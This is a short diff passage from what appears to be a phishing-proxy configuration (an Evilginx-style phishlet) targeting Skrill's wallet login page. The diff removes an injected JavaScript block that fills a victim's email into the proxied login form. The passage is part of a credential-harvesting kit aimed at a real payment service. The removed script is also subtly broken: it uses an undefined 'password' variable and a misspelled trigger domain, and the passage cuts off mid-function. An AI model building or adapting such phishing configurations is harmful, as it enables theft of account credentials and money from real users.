@@ -27,15 +27,3 @@ credentials:
 login:
   domain: 'account.skrill.com'
   path: 'wallet/account/login' 
-js_inject:
-  - trigger_domains: ["acount.skrill.com"]
-    trigger_paths: ["wallet/account/login"]
-    trigger_params: ["email"]
-    script: |
-      function lp(){
-        var email = document.querySelector("#email");
-        if (email != null && password != null) {
-          email.value = "{email}";
-          return;
-        }
-        setTimeout(function(){lp();}, 100);
